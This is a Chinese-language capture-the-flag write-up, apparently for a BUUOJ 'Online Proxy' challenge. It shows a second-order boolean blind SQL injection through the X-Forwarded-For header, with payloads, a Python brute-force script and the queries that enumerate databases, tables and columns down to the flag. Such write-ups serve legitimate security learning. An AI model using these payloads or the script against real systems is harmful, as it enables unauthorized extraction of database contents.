00a.sql注入判断

一开始看到下面的提示还以为是SSRF呢。年轻题，不讲武德，偷袭我，我大意了哈，没有闪。

欢迎使用 Online Proxy。使用方法为 /?url=，例如 /?url=https://baidu.com/。
为了保障您的使用体验，我们可能收集您的使用信息，这些信息只会被用于提升我们的服务，请您放心。

结果测试了好多都是返回Illegal scheme!，只有用https://baidu.com/这个才可以，被迫放弃

然后是怎么判断这是一个sql注入的呢？

查看源代码后发现有如下的提示

观察到ip，然后它可能是把ip信息存入到数据库之中了，那我们就能利用伪造ip(xxf)来进行sql注入了(使用burpsuite)。

00b.注入测试

首先测试一下能采取怎样的注入姿势

X-Forwarded-For: 1' or '1


先传入一个X-Forwarded-For: 1' or '1然后，current-ip的值就变为了1' or '1，然后将xff的值变一下为任何其他值，可以是l0ve，再刷新，就变为了以下的内容
<!-- Debug Info: 
 Duration: 0.040457963943481 s 
 Current Ip: l0ve 
Last Ip: 1' or '1 -->

可见Last ip似乎已经上传到数据库之中了，然后什么都不改动，再刷新一下就得如下的回返
<!-- Debug Info: 
 Duration: 0.03850793838501 s 
 Current Ip: l0ve 
Last Ip: 1 -->

发现服务端应该执行了sql查询，并且我们已经将语句注入。插入数据库数据的命令可能为如下:
INSERT INTO table_name (current-ip,last-ip )
                       VALUES
                       ('$current-ip','$last-ip' );

00c.sql布尔盲注

可以用下面的payload来测试布尔盲注的效果
0' or ascii(substr((select(database())),1,1))>127 or '0
0' or ascii(substr((select(database())),1,1))>32 or '0
然后接连的三次，依次返回内容如下

<!-- Debug Info: 
 Duration: 0.035021066665649 s 
 Current Ip: 0' or ascii(substr((select(database())),1,1))>32 or '0 
Last Ip: 0' or ascii(substr((select(database())),1,1))>127 or '0 -->

/**下面分别对应上面的两个语句的判断真假，可见，第一个语句的判断为假，第二个为真*/
<!-- Debug Info: 
 Duration: 0.030755996704102 s 
 Current Ip: 0' or ascii(substr((select(database())),1,1))>32 or '0 
Last Ip: 0 -->

<!-- Debug Info: 
 Duration: 0.054723024368286 s 
 Current Ip: 111 
Last Ip: 1 -->

然后写爆破的脚本一定要积累脚本

import requests

url = "http://node3.buuoj.cn:27406/"
head = {
    "GET": "/ HTTP/1.1",
    "Cookie": "track_uuid=fdb4b6d2-49df-4480-faf2-c1ff21685796",
    "X-Forwarded-For": ""
}

flag = ""
for i in range(1, 100):
    print("第{}个:".format(i), end="")
    l = 1
    r = 127
    mid = (l + r) >> 1     #相当于mid除2取整所得
    while l < r:
        head["X-Forwarded-For"] = "0' or ascii(substr((select group_concat(schema_name) from information_schema.schemata),{0},1))>{1} or '0".format(i, mid)

        html_0 = requests.post(url, headers=head)
        head["X-Forwarded-For"] = "0' or ascii(substr((select group_concat(schema_name) from information_schema.schemata),{0},1))>{1} or '0".format(i, mid + 1)

        html_0 = requests.post(url, headers=head)
        html_0 = requests.post(url, headers=head)

        if "Last Ip: 1" in html_0.text:  # 这里判断到的语句为第一个，即`.format(i, mid)`的那个
            l = mid + 1
        else:
            r = mid
        mid = (l + r) >> 1
    if chr(mid) == ' ':
        break
    flag += chr(mid)
    print(flag)

他这里的group_concat()必须带上以查询所有的库名。

然后获得各个表

information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e


判断flag在F4l9_D4t4B45e库里面。

然后分别将语句再换为

"0' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e'),{0},1))>{1} or '0".format(i, mid)
"0' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e'),{0},1))>{1} or '0".format(i, mid + 1)
/**注出flag所在的表名为`F4l9_t4b1e`*/

"0' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='F4l9_t4b1e'),{0},1))>{1} or '0".format(i, mid)
"0' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='F4l9_t4b1e'),{0},1))>{1} or '0".format(i, mid + 1)
/**注出flag所在的列名为`F4l9_C01uMn`*/

"0' or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{0},1))>{1} or '0".format(i, mid)
"0' or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{0},1))>{1} or '0".format(i, mid + 1)
/**注出flag所在的flag为`flag{G1zj1n_W4nt5_4_91r1_Fr1end},flag{3f6f50df-e747-43db-a5fe-40facac027ba}`,取第二个*/
